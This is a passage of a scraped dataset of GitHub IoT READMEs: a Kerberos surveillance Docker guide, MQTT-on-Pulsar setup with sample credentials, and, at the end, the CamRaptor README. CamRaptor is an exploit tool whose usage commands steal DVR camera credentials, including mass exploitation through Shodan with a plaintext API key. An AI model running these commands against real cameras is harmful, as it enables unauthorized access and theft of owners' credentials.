also a great way to backup your security configuration.\nCAMERA 1 <<== CONTAINER1 <<== environment/cameraconfig1\nCAMERA 2 <<== CONTAINER2 <<== environment/cameraconfig2\nCAMERA 3 <<== CONTAINER2 <<== environment/cameraconfig3\nHow to use it?\nThe tool we've created is a simple bash script which we called dockeros, and exposes a couple of methods; discussed below. By specifying a number of parameters, dockeros will do all the magic dockering for you. This tool is still work in progress, so PR's and new features are welcome!\ngit clone https://github.com/kerberos-io/docker\ncd docker/bin\n./dockeros.sh {command}\nCommands\nList all kerberos.io containers which are created.\n./dockeros.sh showall\nRemove all kerberos.io containers which were created before.\n./dockeros.sh cleanup\nCreate a kerberos.io container with a name and predefined configuration.\n./dockeros.sh create {name} {config} {webport} {streamport}\nname: This is the name of the container which will be created.\nconfig: The configuration which needs to be injected in the container. The configuration directories can be found in the /environments folder.\nwebport: The port on which the webinterface will be served.\nstreamport: The port on which the livestream will be served.\nBuildx\ndocker run --rm --privileged docker/binfmt:66f9012c56a8316f9244ffd7622d7c21c1f6f28d\ndocker buildx create --name nubuilder --driver docker-container\ndocker buildx use nubuilder\ndocker buildx inspect --bootstrap\n# linux/arm/v6 gives issues on php7.1\ndocker buildx build --platform linux/amd64,linux/arm/v7,linux/arm64 -t kerberos/kerberos --push .", "link": "https://github.com/kerberos-io/kerberos-docker", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "kerberos open source - docker\nlicense\nthe kerberos open source project is licensed with by-nc-sa 4.0, this means that everyone can use kerberos and modify if to their needs, in a non commercial activity.\nmore information about this license.\nwhy kerberos?\nas burglary is very common, we believe that video surveillance is a trivial -----> tool !!!  in our daily lifes which helps us to feel a little bit more secure. responding to this need, a lot of companies have started developing their own video surveillance software in the past few years.\nnowadays we have a myriad of expensive cameras, recorders, and software solutions which are mainly outdated and difficult to install and use. kerberos open source goal is to solve these problems and to provide every human being in this world to have their own ecological, affordable, easy-to-use and innovative surveillance solution.\ndocker\na docker image (x86, armv7, armv8) is available on the docker hub, which contains all the necessary software to setup the kerberos agent. before you can run this image you will have to make sure docker is installed. after the installation you can use docker run to get the kerberos agent up and running; you can also opt for dockeros to create and scale your kerberos agents.\nuse docker run\nafter you've installed docker, you can open a command prompt and type in following command. this will pull the kerberos image and make the web interface available on port 80 and the livestream on port 8889. you can give the container a custom name using the --name property.\ndocker run --name camera1 -p 80:80 -p 8889:8889 -d kerberos/kerberos\ndocker run --name camera2 -p 81:80 -p 8890:8889 -d kerberos/kerberos\ndocker run --name camera3 -p 82:80 -p 8891:8889 -d kerberos/kerberos\nor use dockeros (our docker creation tool)\nwe've created a simple and small tool to auto provision and auto configure the kerberos agents. the idea is that you define the different configurations for every camera upfront (/environments directory), and map them to into your docker container (using volumes). the ultimate goal is to have a fully automated for provisioning your kerberos agents in just a matter of seconds. it's also a great way to backup your security configuration.\ncamera 1 <<== container1 <<== environment/cameraconfig1\ncamera 2 <<== container2 <<== environment/cameraconfig2\ncamera 3 <<== container2 <<== environment/cameraconfig3\nhow to use it?\nthe tool we've created is a simple bash script which we called dockeros, and exposes a couple of methods; discussed below. by specifying a number of parameters, dockeros will do all the magic dockering for you. this tool is still work in progress, so pr's and new features are welcome!\ngit clone https://github.com/kerberos-io/docker\ncd docker/bin\n./dockeros.sh {command}\ncommands\nlist all kerberos.io containers which are created.\n./dockeros.sh showall\nremove all kerberos.io containers which were created before.\n./dockeros.sh cleanup\ncreate a kerberos.io container with a name and predefined configuration.\n./dockeros.sh create {name} {config} {webport} {streamport}\nname: this is the name of the container which will be created.\nconfig: the configuration which needs to be injected in the container. the configuration directories can be found in the /environments folder.\nwebport: the port on which the webinterface will be served.\nstreamport: the port on which the livestream will be served.\nbuildx\ndocker run --rm --privileged docker/binfmt:66f9012c56a8316f9244ffd7622d7c21c1f6f28d\ndocker buildx create --name nubuilder --driver docker-container\ndocker buildx use nubuilder\ndocker buildx inspect --bootstrap\n# linux/arm/v6 gives issues on php7.1\ndocker buildx build --platform linux/amd64,linux/arm/v7,linux/arm64 -t kerberos/kerberos --push .", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000560, "year": null}, {"Unnamed: 0": 581, "autor": 581, "date": null, "content": "MQTT on Pulsar (MoP)\nMQTT-on-Pulsar (aka MoP) is developed to support MQTT protocol natively on Apache Pulsar. Currently, only MQTT 3.1.1 supported.\nGet started\nDownload or build MoP protocol handler\nClone the MoP project from GitHub to your local.\ngit clone https://github.com/streamnative/mop.git\ncd mop\nBuild the project.\nmvn clean install -DskipTests\nThe NAR file can be found at this location.\n./mqtt-impl/target/pulsar-protocol-handler-mqtt-${version}.nar\nInstall MoP protocol handler\nConfigure the Pulsar broker to run the MoP protocol handler as a plugin by adding configurations to the Pulsar configuration file, such as broker.conf or standalone.conf.\nSet the configuration of the MoP protocol handler.\nAdd the following properties and set their values in the Pulsar configuration file, such as conf/broker.conf or conf/standalone.conf.\nProperty Suggested value Default value\nmessagingProtocols mqtt null\nprotocolHandlerDirectory Location of MoP NAR file ./protocols\nExample\nmessagingProtocols=mqtt\nprotocolHandlerDirectory=./protocols\nSet the MQTT server listeners.\nExample\nmqttListeners=mqtt://127.0.0.1:1883\nadvertisedAddress=127.0.0.1\nNote\nThe default hostname of advertisedAddress is InetAddress.getLocalHost().getHostName(). If you'd like to config this, please keep the same as Pulsar broker's advertisedAddress.\nLoad MoP protocol handler\nAfter you install the MoP protocol handler to Pulsar broker, you can restart the Pulsar brokers to load the MoP protocol handler.\nHow to use Proxy\nTo use the proxy, follow the following steps. For detailed steps, refer to Deploy a cluster on bare metal.\nPrepare a ZooKeeper cluster.\nInitialize the cluster metadata.\nPrepare a BookKeeper cluster.\nCopy the pulsar-protocol-handler-mqtt-${version}.nar to the $PULSAR_HOME/protocols directory.\nStart the Pulsar broker.\nHere is an example of the Pulsar broker configuration.\nmessagingProtocols=mqtt\nprotocolHandlerDirectory=./protocols\nbrokerServicePort=6651\nmqttListeners=mqtt://127.0.0.1:1883\nadvertisedAddress=127.0.0.1\nmqttProxyEnabled=true\nmqttProxyPort=5682\nVerify MoP protocol handler\nThere are many MQTT client that can be used to verify the MoP protocol handler, such as MQTTBox, MQTT Toolbox. You can choose a CLI tool or interface tool to verify the MoP protocol handler.\nThe following example shows how to verify the MoP protocol handler with FuseSource MqttClient.\nAdd the dependency.\n<dependency>\n<groupId>org.fusesource.mqtt-client</groupId>\n<artifactId>mqtt-client</artifactId>\n<version>1.16</version>\n</dependency>\nPublish messages and consume messages.\nMQTT mqtt = new MQTT();\nmqtt.setHost(\"127.0.0.1\", 1883);\nBlockingConnection connection = mqtt.blockingConnection();\nconnection.connect();\nTopic[] topics = { new Topic(\"persistent://public/default/my-topic\", QoS.AT_LEAST_ONCE) };\nconnection.subscribe(topics);\n// publish message\nconnection.publish(\"persistent://public/default/my-topic\", \"Hello MOP!\".getBytes(), QoS.AT_LEAST_ONCE, false);\n// receive message\nMessage received = connection.receive();\nSecurity\nEnabling Authentication\nMoP currently supports basic and token authentication methods. The token authentication method works with any of the token based Pulsar authentication providers such as the built-in JWT provider and external token authentication providers like biscuit-pulsar.\nTo use authentication for MQTT connections your Pulsar cluster must already have authentication enabled with your chosen authentication provider(s) configured.\nYou can then enable MQTT authentication with the following configuration properties:\nmqttAuthenticationEnabled=true\nmqttAuthenticationMethods=token\nmqttAuthenticationMethods can be set to a comma delimited list if you wish to enable multiple authentication providers. MoP will attempt each in order when authenticating client connections.\nWith authentication enabled MoP will not allow anonymous connections currently.\nAuthenticating client connections\nBasic Authentication\nSet the MQTT username and password client settings.\nToken Authentication\nSet the MQTT password to the token body, currently username will be disregarded but MUST be set to some value as this is required by the MQTT specification.\nEnabling Authorization\nMoP currently supports authorization. When authorization enabled, MoP will check the authenticated role if it has the ability to pub/sub topics, eg: When sending messages, you need to have the produce permission of the topic. When subscribing to a topic, you need to have the consume permission of the topic. You can reference here to grant permissions.\nYou can then enable MQTT authorization with the following configuration properties:\nmqttAuthorizationEnabled=true\nIf MoP proxy enabled, following configuration needs to be configured and brokerClientAuthenticationParameters should configure lookup permission at least:\nbrokerClientAuthenticationPlugin=org.apache.pulsar.client.impl.auth.AuthenticationBasic\nbrokerClientAuthenticationParameters={\"userId\":\"superUser\",\"password\":\"superPass\"}\nEnabling TLS\nMoP currently supports TLS transport encryption.\nGenerate crt and key file :\nopenssl genrsa 2048 > server.key\nchmod 400 server.key\nopenssl req -new -x509 -nodes -sha256 -days 365 -key server.key -out server.crt\nTLS with broker\nConfig mqtt broker to load tls config.\n...\ntlsEnabled=true\nmqttListeners=mqtt+ssl://127.0.0.1:8883\ntlsCertificateFilePath=/xxx/server.crt\ntlsKeyFilePath=/xxx/server.key\n...\nConfig client to load tls config.\nMQTT mqtt = new MQTT();\n// default tls port\nmqtt.setHost(URI.create(\"ssl://127.0.0.1:8883\"));\nFile crtFile = new File(\"server.crt\");\nCertificate certificate = CertificateFactory.getInstance(\"X.509\").generateCertificate(new FileInputStream(crtFile));\nKeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\nkeyStore.load(null, null);\nkeyStore.setCertificateEntry(\"server\", certificate);\nTrustManagerFactory trustManagerFactory = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());\ntrustManagerFactory.init(keyStore);\nSSLContext sslContext = SSLContext.getInstance(\"TLS\");\nsslContext.init(null, trustManagerFactory.getTrustManagers(), null);\nmqtt.setSslContext(sslContext);\nBlockingConnection connection = mqtt.blockingConnection();\nconnection.connect();\n...\nTLS with proxy\nConfig mqtt broker to load tls config.\n...\nmqttProxyEnable=true\nmqttProxyTlsEnabled=true\ntlsCertificateFilePath=/xxx/server.crt\ntlsKeyFilePath=/xxx/server.key\n...\nConfig client to load tls config.\nMQTT mqtt = new MQTT();\n// default proxy tls port\nmqtt.setHost(URI.create(\"ssl://127.0.0.1:5683\"));\nFile crtFile = new File(\"server.crt\");\nCertificate certificate = CertificateFactory.getInstance(\"X.509\").generateCertificate(new FileInputStream(crtFile));\nKeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());\nkeyStore.load(null, null);\nkeyStore.setCertificateEntry(\"server\", certificate);\nTrustManagerFactory trustManagerFactory = TrustManagerFactory.getInstance(TrustManagerFactory.getDefaultAlgorithm());\ntrustManagerFactory.init(keyStore);\nSSLContext sslContext = SSLContext.getInstance(\"TLS\");\nsslContext.init(null, trustManagerFactory.getTrustManagers(), null);\nmqtt.setSslContext(sslContext);\nBlockingConnection connection = mqtt.blockingConnection();\nconnection.connect();\n...\nTLS PSK with broker\nPlease reference here to learn more about TLS-PSK.\nConfig mqtt broker to load tls psk config.\n...\ntlsPskEnabled=true\nmqttListeners=mqtt+ssl+psk://127.0.0.1:8884\n// any string can be specified\ntlsPskIdentityHint=alpha\n// identity is semicolon list of string with identity:secret format\ntlsPskIdentity=mqtt:mqtt123\n...\nOptional configs\nConfig key Comment\ntlsPskIdentityFile When you want identities in a single file with many pairs, you can config this. Identities will load from both tlsPskIdentity and tlsPskIdentityFile\ntlsProtocols TLS PSK protocols, default are [ TLSv1, TLSv1.1, TLSv1.2 ]\ntlsCiphers TLS PSK ciphers, default are [ TLS_ECDHE_PSK_WITH_CHACHA20_POLY1305_SHA256, TLS_ECDHE_PSK_WITH_AES_128_CBC_SHA, TLS_ECDHE_PSK_WITH_AES_256_CBC_SHA, TLS_PSK_WITH_AES_128_CBC_SHA, TLS_PSK_WITH_AES_256_CBC_SHA ]\nAs current known mqtt Java client does not support TLS-PSK, it's better to verify this by mosquitto cli\n# Default with tlsv1.2\nmosquitto_pub --psk-identity mqtt --psk 6d717474313233 -p 8884 -t \"/a/b/c\" -m \"hello mqtt\"\n# Test with tlsv1.1\nmosquitto_pub --psk-identity mqtt --psk 6d717474313233 -p 8884 -t \"/a/b/c\" -m \"hello mqtt\" --tls-version tlsv1.1\n# Test with tlsv1\nmosquitto_pub --psk-identity mqtt --psk 6d717474313233 -p 8884 -t \"/a/b/c\" -m \"hello mqtt\" --tls-version tlsv1\nDownload mosquitto with Mac version.\nThe secret mqtt123 is converted to 6d717474313233 using Hex Code Converter\nTLS PSK with proxy\nConfig mqtt proxy to load tls psk config.\n...\nmqttProxyEnable=true\nmqttProxyTlsPskEnabled=true\n// default tls psk port\nmqttProxyTlsPskPort=5684\n// any string can be specified\ntlsPskIdentityHint=alpha\n// identity is semicolon list of string with identity:secret format\ntlsPskIdentity=mqtt:mqtt123\n...\nTest with mosquitto cli\nmosquitto_pub --psk-identity mqtt --psk 6d717474313233 -p 5684 -t \"/a/b/c\" -m \"hello mqtt\"\nTopic Names & Filters\nFor Apache Pulsar, The topic name consists of 4 parts:\n<domain>://<tenant>/<namespace>/<local-name>\nAnd / is not allowed in the local topic name. But for the MQTT topic name can have multiple levels such as:\n/a/b/c/d/e/f\nMoP mapping the MQTT topic name to Pulsar topic name as follows:\nIf the MQTT topic name does not start with the topic domain, MoP treats the URL encoded MQTT topic name as the Pulsar local topic name, and the default tenant and default namespace will be used to map the Pulsar topic name.\nIf the MQTT topic name starts with the topic domain, MoP will treat the first level topic name as the tenant and the second level topic name as the namespace and the remaining topic name levels will be covert as the local topic name with URL encoded.\nExamples:\nMQTT topic name Apache Pulsar topic name\n/a/b/c persistent://public/default/%2Fa%2Fb%2Fc\na persistent://public/default/a\npersistent://my-tenant/my-ns/a/b/c persistent://my-tenant/my-ns/a%2Fb%2Fc\npersistent://my-tenant/my-ns/a persistent://my-tenant/my-ns/a\nnon-persistent://my-tenant/my-ns/a non-persistent://my-tenant/my-ns/a\nnon-persistent://my-tenant/my-ns/a/b/c non-persistent://my-tenant/my-ns/a%2Fb%2Fc\nSo if you want to consume messages by Pulsar Client from the topic /a/b/c, the topic name for the Pulsar consumer should be persistent://public/default/%2Fa%2Fb%2Fc. If you want to consume messages from a Pulsar topic by the MQTT client, use the Pulsar topic name as the MQTT topic name directly.\nMoP topic supports single-level wildcard + and multi-level wildcard #. The topic name filter also follows the above topic name mapping rules.\nIf the topic filter starts with the topic domain, MoP only filters the topic under the namespace that the topic filter provided.\nIf the topic filter does not start with the topic domain, MoP only filters the topic name under the default namespace.\nExamples:\nMQTT topic name Topic filter Is match\n/a/b/c /a/+/c Yes\n/a/b/c /a/# Yes\n/a/b/c a/# No\n/a/b/c persistent://my-tenant/my-namespace//a/# No\n/a/b/c persistent://public/default//a/# Yes\npersistent://public/default/a/b/c persistent://public/default/a/# Yes\npersistent://public/default/a/b/c persistent://public/default/a/+/c Yes\npersistent://public/default/a/b/c persistent://public/default//a/+/c No\npersistent://public/default/a/b/c persistent://my-tenant/my-namespace/a/+/c No\nNotice:\nThe default tenant and the default namespace for the MoP are configurable, by default, the default tenant is public and the default namespace is default.\nMetrics\nMoP will uniformly output its own metrics to Prometheus.\nName Type Description\nmop_active_client_count Gauge The active client count\nmop_total_client_count Counter The total client count\nmop_maximum_client_count Counter The maximum client count\nmop_sub_count Gauge The subscription count\nmop_send_count Counter The total send msg count\nmop_send_bytes Counter The total send msg in bytes\nmop_received_count Counter The total received msg count\nmop_received_bytes Counter The total received msg in bytes\nMoP also exposes the http interface through /mop-stats, and users can obtain mop information in json format through that path.\ncurl http://pulsar-broker-webservice-address:port/mop-stats/\n{\"cluster\":\"test\",\"subscriptions\":{\"subs\":[\"/a/b/c\"],\"count\":1},\"clients\":{\"total\":1,\"maximum\":1,\"active\":0,\"active_clients\":[]},\"namespace\":\"default\",\"messages\":{\"received_bytes\":57351,\"received_count\":10,\"send_count\":20,\"send_bytes\":60235},\"version\":\"2.9.0-SNAPSHOT\",\"tenant\":\"public\",\"uptime\":\"46 seconds\"}\nMoP available configurations\nPlease refer here\nDeclarations\nCurrently, MoP has the following implementations that do not meet the MQTT Spec:\nThe MQTT spec calls for terminating existing clients with the same ClientID on CONNECT. But MoP only implements on proxy or broker side, not across cluster.\nLast Will implements not across cluster.\nProject maintainers\n@Technoboy-\n@codelipenghui", "link": "https://github.com/streamnative/mop", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", "MarkedSent": "mqtt on pulsar (mop)\nmqtt-on-pulsar (aka mop) is developed to support mqtt protocol natively on apache pulsar. currently, only mqtt 3.1.1 supported.\nget started\ndownload or build mop protocol handler\nclone the mop project from github to your local.\ngit clone https://github.com/streamnative/mop.git\ncd mop\nbuild the project.\nmvn clean install -dskiptests\nthe nar file can be found at this location.\n./mqtt-impl/target/pulsar-protocol-handler-mqtt-${version}.nar\ninstall mop protocol handler\nconfigure the pulsar broker to run the mop protocol handler as a plugin by adding configurations to the pulsar configuration file, such as broker.conf or standalone.conf.\nset the configuration of the mop protocol handler.\nadd the following properties and set their values in the pulsar configuration file, such as conf/broker.conf or conf/standalone.conf.\nproperty suggested value default value\nmessagingprotocols mqtt null\nprotocolhandlerdirectory location of mop nar file ./protocols\nexample\nmessagingprotocols=mqtt\nprotocolhandlerdirectory=./protocols\nset the mqtt server listeners.\nexample\nmqttlisteners=mqtt://127.0.0.1:1883\nadvertisedaddress=127.0.0.1\nnote\nthe default hostname of advertisedaddress is inetaddress.getlocalhost().gethostname(). if you'd like to config this, please keep the same as pulsar broker's advertisedaddress.\nload mop protocol handler\nafter you install the mop protocol handler to pulsar broker, you can restart the pulsar brokers to load the mop protocol handler.\nhow to use proxy\nto use the proxy, follow the following steps. for detailed steps, refer to deploy a cluster on bare metal.\nprepare a zookeeper cluster.\ninitialize the cluster metadata.\nprepare a bookkeeper cluster.\ncopy the pulsar-protocol-handler-mqtt-${version}.nar to the $pulsar_home/protocols directory.\nstart the pulsar broker.\nhere is an example of the pulsar broker configuration.\nmessagingprotocols=mqtt\nprotocolhandlerdirectory=./protocols\nbrokerserviceport=6651\nmqttlisteners=mqtt://127.0.0.1:1883\nadvertisedaddress=127.0.0.1\nmqttproxyenabled=true\nmqttproxyport=5682\nverify mop protocol handler\nthere are many mqtt client that can be used to verify the mop protocol handler, such as mqttbox, mqtt toolbox. you can choose a cli -----> tool !!!  or interface -----> tool !!!  to verify the mop protocol handler.\nthe following example shows how to verify the mop protocol handler with fusesource mqttclient.\nadd the dependency.\n<dependency>\n<groupid>org.fusesource.mqtt-client</groupid>\n<artifactid>mqtt-client</artifactid>\n<version>1.16</version>\n</dependency>\npublish messages and consume messages.\nmqtt mqtt = new mqtt();\nmqtt.sethost(\"127.0.0.1\", 1883);\nblockingconnection connection = mqtt.blockingconnection();\nconnection.connect();\ntopic[] topics = { new topic(\"persistent://public/default/my-topic\", qos.at_least_once) };\nconnection.subscribe(topics);\n// publish message\nconnection.publish(\"persistent://public/default/my-topic\", \"hello mop!\".getbytes(), qos.at_least_once, false);\n// receive message\nmessage received = connection.receive();\nsecurity\nenabling authentication\nmop currently supports basic and token authentication methods. the token authentication method works with any of the token based pulsar authentication providers such as the built-in jwt provider and external token authentication providers like biscuit-pulsar.\nto use authentication for mqtt connections your pulsar cluster must already have authentication enabled with your chosen authentication provider(s) configured.\nyou can then enable mqtt authentication with the following configuration properties:\nmqttauthenticationenabled=true\nmqttauthenticationmethods=token\nmqttauthenticationmethods can be set to a comma delimited list if you wish to enable multiple authentication providers. mop will attempt each in order when authenticating client connections.\nwith authentication enabled mop will not allow anonymous connections currently.\nauthenticating client connections\nbasic authentication\nset the mqtt username and password client settings.\ntoken authentication\nset the mqtt password to the token body, currently username will be disregarded but must be set to some value as this is required by the mqtt specification.\nenabling authorization\nmop currently supports authorization. when authorization enabled, mop will check the authenticated role if it has the ability to pub/sub topics, eg: when sending messages, you need to have the produce permission of the topic. when subscribing to a topic, you need to have the consume permission of the topic. you can reference here to grant permissions.\nyou can then enable mqtt authorization with the following configuration properties:\nmqttauthorizationenabled=true\nif mop proxy enabled, following configuration needs to be configured and brokerclientauthenticationparameters should configure lookup permission at least:\nbrokerclientauthenticationplugin=org.apache.pulsar.client.impl.auth.authenticationbasic\nbrokerclientauthenticationparameters={\"userid\":\"superuser\",\"password\":\"superpass\"}\nenabling tls\nmop currently supports tls transport encryption.\ngenerate crt and key file :\nopenssl genrsa 2048 > server.key\nchmod 400 server.key\nopenssl req -new -x509 -nodes -sha256 -days 365 -key server.key -out server.crt\ntls with broker\nconfig mqtt broker to load tls config.\n...\ntlsenabled=true\nmqttlisteners=mqtt+ssl://127.0.0.1:8883\ntlscertificatefilepath=/xxx/server.crt\ntlskeyfilepath=/xxx/server.key\n...\nconfig client to load tls config.\nmqtt mqtt = new mqtt();\n// default tls port\nmqtt.sethost(uri.create(\"ssl://127.0.0.1:8883\"));\nfile crtfile = new file(\"server.crt\");\ncertificate certificate = certificatefactory.getinstance(\"x.509\").generatecertificate(new fileinputstream(crtfile));\nkeystore keystore = keystore.getinstance(keystore.getdefaulttype());\nkeystore.load(null, null);\nkeystore.setcertificateentry(\"server\", certificate);\ntrustmanagerfactory trustmanagerfactory = trustmanagerfactory.getinstance(trustmanagerfactory.getdefaultalgorithm());\ntrustmanagerfactory.init(keystore);\nsslcontext sslcontext = sslcontext.getinstance(\"tls\");\nsslcontext.init(null, trustmanagerfactory.gettrustmanagers(), null);\nmqtt.setsslcontext(sslcontext);\nblockingconnection connection = mqtt.blockingconnection();\nconnection.connect();\n...\ntls with proxy\nconfig mqtt broker to load tls config.\n...\nmqttproxyenable=true\nmqttproxytlsenabled=true\ntlscertificatefilepath=/xxx/server.crt\ntlskeyfilepath=/xxx/server.key\n...\nconfig client to load tls config.\nmqtt mqtt = new mqtt();\n// default proxy tls port\nmqtt.sethost(uri.create(\"ssl://127.0.0.1:5683\"));\nfile crtfile = new file(\"server.crt\");\ncertificate certificate = certificatefactory.getinstance(\"x.509\").generatecertificate(new fileinputstream(crtfile));\nkeystore keystore = keystore.getinstance(keystore.getdefaulttype());\nkeystore.load(null, null);\nkeystore.setcertificateentry(\"server\", certificate);\ntrustmanagerfactory trustmanagerfactory = trustmanagerfactory.getinstance(trustmanagerfactory.getdefaultalgorithm());\ntrustmanagerfactory.init(keystore);\nsslcontext sslcontext = sslcontext.getinstance(\"tls\");\nsslcontext.init(null, trustmanagerfactory.gettrustmanagers(), null);\nmqtt.setsslcontext(sslcontext);\nblockingconnection connection = mqtt.blockingconnection();\nconnection.connect();\n...\ntls psk with broker\nplease reference here to learn more about tls-psk.\nconfig mqtt broker to load tls psk config.\n...\ntlspskenabled=true\nmqttlisteners=mqtt+ssl+psk://127.0.0.1:8884\n// any string can be specified\ntlspskidentityhint=alpha\n// identity is semicolon list of string with identity:secret format\ntlspskidentity=mqtt:mqtt123\n...\noptional configs\nconfig key comment\ntlspskidentityfile when you want identities in a single file with many pairs, you can config this. identities will load from both tlspskidentity and tlspskidentityfile\ntlsprotocols tls psk protocols, default are [ tlsv1, tlsv1.1, tlsv1.2 ]\ntlsciphers tls psk ciphers, default are [ tls_ecdhe_psk_with_chacha20_poly1305_sha256, tls_ecdhe_psk_with_aes_128_cbc_sha, tls_ecdhe_psk_with_aes_256_cbc_sha, tls_psk_with_aes_128_cbc_sha, tls_psk_with_aes_256_cbc_sha ]\nas current known mqtt java client does not support tls-psk, it's better to verify this by mosquitto cli\n# default with tlsv1.2\nmosquitto_pub --psk-identity mqtt --psk 6d717474313233 -p 8884 -t \"/a/b/c\" -m \"hello mqtt\"\n# test with tlsv1.1\nmosquitto_pub --psk-identity mqtt --psk 6d717474313233 -p 8884 -t \"/a/b/c\" -m \"hello mqtt\" --tls-version tlsv1.1\n# test with tlsv1\nmosquitto_pub --psk-identity mqtt --psk 6d717474313233 -p 8884 -t \"/a/b/c\" -m \"hello mqtt\" --tls-version tlsv1\ndownload mosquitto with mac version.\nthe secret mqtt123 is converted to 6d717474313233 using hex code converter\ntls psk with proxy\nconfig mqtt proxy to load tls psk config.\n...\nmqttproxyenable=true\nmqttproxytlspskenabled=true\n// default tls psk port\nmqttproxytlspskport=5684\n// any string can be specified\ntlspskidentityhint=alpha\n// identity is semicolon list of string with identity:secret format\ntlspskidentity=mqtt:mqtt123\n...\ntest with mosquitto cli\nmosquitto_pub --psk-identity mqtt --psk 6d717474313233 -p 5684 -t \"/a/b/c\" -m \"hello mqtt\"\ntopic names & filters\nfor apache pulsar, the topic name consists of 4 parts:\n<domain>://<tenant>/<namespace>/<local-name>\nand / is not allowed in the local topic name. but for the mqtt topic name can have multiple levels such as:\n/a/b/c/d/e/f\nmop mapping the mqtt topic name to pulsar topic name as follows:\nif the mqtt topic name does not start with the topic domain, mop treats the url encoded mqtt topic name as the pulsar local topic name, and the default tenant and default namespace will be used to map the pulsar topic name.\nif the mqtt topic name starts with the topic domain, mop will treat the first level topic name as the tenant and the second level topic name as the namespace and the remaining topic name levels will be covert as the local topic name with url encoded.\nexamples:\nmqtt topic name apache pulsar topic name\n/a/b/c persistent://public/default/%2fa%2fb%2fc\na persistent://public/default/a\npersistent://my-tenant/my-ns/a/b/c persistent://my-tenant/my-ns/a%2fb%2fc\npersistent://my-tenant/my-ns/a persistent://my-tenant/my-ns/a\nnon-persistent://my-tenant/my-ns/a non-persistent://my-tenant/my-ns/a\nnon-persistent://my-tenant/my-ns/a/b/c non-persistent://my-tenant/my-ns/a%2fb%2fc\nso if you want to consume messages by pulsar client from the topic /a/b/c, the topic name for the pulsar consumer should be persistent://public/default/%2fa%2fb%2fc. if you want to consume messages from a pulsar topic by the mqtt client, use the pulsar topic name as the mqtt topic name directly.\nmop topic supports single-level wildcard + and multi-level wildcard #. the topic name filter also follows the above topic name mapping rules.\nif the topic filter starts with the topic domain, mop only filters the topic under the namespace that the topic filter provided.\nif the topic filter does not start with the topic domain, mop only filters the topic name under the default namespace.\nexamples:\nmqtt topic name topic filter is match\n/a/b/c /a/+/c yes\n/a/b/c /a/# yes\n/a/b/c a/# no\n/a/b/c persistent://my-tenant/my-namespace//a/# no\n/a/b/c persistent://public/default//a/# yes\npersistent://public/default/a/b/c persistent://public/default/a/# yes\npersistent://public/default/a/b/c persistent://public/default/a/+/c yes\npersistent://public/default/a/b/c persistent://public/default//a/+/c no\npersistent://public/default/a/b/c persistent://my-tenant/my-namespace/a/+/c no\nnotice:\nthe default tenant and the default namespace for the mop are configurable, by default, the default tenant is public and the default namespace is default.\nmetrics\nmop will uniformly output its own metrics to prometheus.\nname type description\nmop_active_client_count gauge the active client count\nmop_total_client_count counter the total client count\nmop_maximum_client_count counter the maximum client count\nmop_sub_count gauge the subscription count\nmop_send_count counter the total send msg count\nmop_send_bytes counter the total send msg in bytes\nmop_received_count counter the total received msg count\nmop_received_bytes counter the total received msg in bytes\nmop also exposes the http interface through /mop-stats, and users can obtain mop information in json format through that path.\ncurl http://pulsar-broker-webservice-address:port/mop-stats/\n{\"cluster\":\"test\",\"subscriptions\":{\"subs\":[\"/a/b/c\"],\"count\":1},\"clients\":{\"total\":1,\"maximum\":1,\"active\":0,\"active_clients\":[]},\"namespace\":\"default\",\"messages\":{\"received_bytes\":57351,\"received_count\":10,\"send_count\":20,\"send_bytes\":60235},\"version\":\"2.9.0-snapshot\",\"tenant\":\"public\",\"uptime\":\"46 seconds\"}\nmop available configurations\nplease refer here\ndeclarations\ncurrently, mop has the following implementations that do not meet the mqtt spec:\nthe mqtt spec calls for terminating existing clients with the same clientid on connect. but mop only implements on proxy or broker side, not across cluster.\nlast will implements not across cluster.\nproject maintainers\n@technoboy-\n@codelipenghui", "sortedWord": "None", "removed": "Nan", "score": null, "comments": null, "media": "Nan", "medialink": "Nan", "identifyer": 7000581, "year": null}, {"Unnamed: 0": 584, "autor": 584, "date": null, "content": "CamRaptor\nCamRaptor is a tool that exploits several vulnerabilities in popular DVR cameras to obtain network camera credentials.\nFeatures\nExploits vulnerabilities in most popular camera models such as Novo, CeNova and QSee.\nOptimized to exploit multiple cameras at one time from list with threading enabled.\nSimple CLI and API usage.\nInstallation\npip3 install git+https://github.com/EntySec/CamRaptor\nBasic usage\nTo use CamRaptor just type camraptor in your terminal.\nusage: camraptor [-h] [-t] [-o OUTPUT] [-i INPUT] [-a ADDRESS]\n[--shodan SHODAN] [--zoomeye ZOOMEYE] [-p PAGES]\nCamRaptor is a tool that exploits several vulnerabilities in popular DVR\ncameras to obtain network camera credentials.\noptional arguments:\n-h, --help show this help message and exit\n-t, --threads Use threads for fastest work.\n-o OUTPUT, --output OUTPUT\nOutput result to file.\n-i INPUT, --input INPUT\nInput file of addresses.\n-a ADDRESS, --address ADDRESS\nSingle address.\n--shodan SHODAN Shodan API key for exploiting devices over Internet.\n--zoomeye ZOOMEYE ZoomEye API key for exploiting devices over Internet.\n-p PAGES, --pages PAGES\nNumber of pages you want to get from ZoomEye.\nExamples\nExploiting single camera\nLet's hack my camera just for fun.\ncamraptor -a 192.168.99.100\nExploiting cameras from Internet\nLet's try to use Shodan search engine to exploit cameras over Internet, we will use it with -t for fast exploitation.\ncamraptor -t --shodan PSKINdQe1GyxGgecYz2191H2JoS9qvgD\nNOTE: Given Shodan API key (PSKINdQe1GyxGgecYz2191H2JoS9qvgD) is my PRO API key, you can use this key or your own, be free to use all our resources for free :)\nExploiting cameras from input file\nLet's try to use opened database of cameras with -t for fast exploitation.\ncamraptor -t -i cameras.txt -o passwords.txt\nNOTE: It will exploit all cameras in cameras.txt list by their addresses and save all obtained passwords to passwords.txt.\nAPI usage\nCamRaptor also has their own Python API that can be invoked by importing CamRaptor to your code.\nfrom camraptor import CamRaptor\nBasic functions\nThere are all CamRaptor basic functions that can be used to exploit specified camera.\nexploit(address) - Exploit single camera by given address.\nExamples\nExploiting single camera\nfrom camraptor import CamRaptor\ncamraptor = CamRaptor()\ncreds = camraptor.exploit('192.168.99.100')\nprint(creds)", "link": "https://github.com/EntySec/CamRaptor", "origin": "Github", "suborigin": "Iot", "result": true, "Selector": "tool", "selectorShort": "tool", 